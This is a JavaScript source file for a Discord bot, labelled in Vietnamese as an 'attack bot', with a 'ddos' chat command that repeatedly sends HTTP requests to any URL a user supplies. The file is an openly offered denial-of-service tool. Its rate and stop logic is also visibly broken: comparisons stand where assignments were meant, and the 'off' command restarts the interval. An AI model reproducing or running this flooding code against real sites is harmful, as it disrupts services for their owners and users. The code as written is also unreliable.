const Discord = require('discord.js');
const client = new Discord.Client();
const request = require('request');
const auth = require('./auth.json');



client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
	client.user.setPresence({
        status: "online",
        game: {
            name: "Bot tấn công",
            type: "STREAMING"
        }
    }); 
});


client.on('message', message => {
var ATK;
if (message.author.bot) return;
const prefix = auth.prefix;
if (message.content.startsWith(prefix)) {
	
	const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
	
	if(command === 'ping') {
		message.channel.send('Pong!')
	}
	if(command === 'ddos') {
		var arr = message.content.split(" "),
			target,
			req,
			req_per_sec;
			function sendReq() {
				if (typeof(target) === 'undefined') {console.log('Sẵn sàng')}
				else {
				request(target, function (error, response, body){
						if(error) {console.log(error)}
						else{console.log('OK')}
					}
				)}
			}
		console.log(arr[1])
		if (arr[1] === 'on'){
			target = arr[2];
			req === arr[3];
			req_per_sec === 1000/req;
			message.channel.send('ON');
		}
		if (arr[1] === 'off'){
			target = arr[2];
			req_per_sec === 10000;
			clearInterval(ATK);
		}
		ATK = setInterval(() => sendReq(), req_per_sec)
	}
}

})

client.login(process.env.TOKEN)